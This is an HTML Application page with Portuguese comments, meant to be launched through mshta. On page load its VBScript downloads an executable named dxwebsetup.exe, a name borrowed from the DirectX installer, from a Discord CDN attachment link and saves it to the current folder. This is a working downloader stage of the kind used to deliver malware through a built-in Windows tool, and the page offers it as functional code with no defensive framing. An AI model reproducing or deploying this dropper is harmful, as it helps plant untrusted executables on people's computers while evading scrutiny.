<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Download MSHTA - Funcional</title>

    <script language="VBScript">
        ' --- Variáveis de Configuração ---
        ' Link direto para o arquivo EXE
        FileURL = "https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&"
        
        ' Nome do arquivo a ser salvo localmente
        LocalFileName = "dxwebsetup.exe"
        
        ' --- Função de Download ---
        Sub Window_Onload()
            On Error Resume Next ' Permite que o script continue se houver erros no sistema de arquivos
            
            document.getElementById("status").innerText = "Iniciando download do " & LocalFileName & " via VBScript...";
            
            ' 1. Faz a requisição HTTP
            Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
            objXMLHttp.open "GET", FileURL, False ' Sincronizado (espera a resposta)
            objXMLHttp.send
            
            If objXMLHttp.Status = 200 Then ' Verifica se a requisição foi bem-sucedida (código 200)
                
                ' 2. Cria o objeto Stream para manipular o arquivo binário
                Set objStream = CreateObject("ADODB.Stream")
                objStream.Open
                objStream.Type = 1 ' adTypeBinary
                
                ' 3. Escreve o conteúdo binário no Stream
                objStream.Write objXMLHttp.responseBody
                
                ' 4. Salva o Stream no arquivo local
                objStream.SaveToFile LocalFileName, 2 ' Sobrescreve se existir (adSaveCreateOverWrite)
                
                objStream.Close
                document.getElementById("status").innerText = "✅ Sucesso! O arquivo " & LocalFileName & " foi salvo no seu disco."
                
            Else
                document.getElementById("status").innerText = "⚠️ Erro na requisição HTTP. Status: " & objXMLHttp.Status
            End If
            
            ' Limpeza de objetos
            Set objStream = Nothing
            Set objXMLHttp = Nothing
            
        End Sub
    </script>
</head>
<body onload="Window_Onload()">

    <h1>Download por MSHTA</h1>
    <p id="status">Aguardando...</p>
    <p>O download será iniciado e o arquivo será salvo na mesma pasta onde você rodou o comando **cmd**.</p>

</body>
</html>
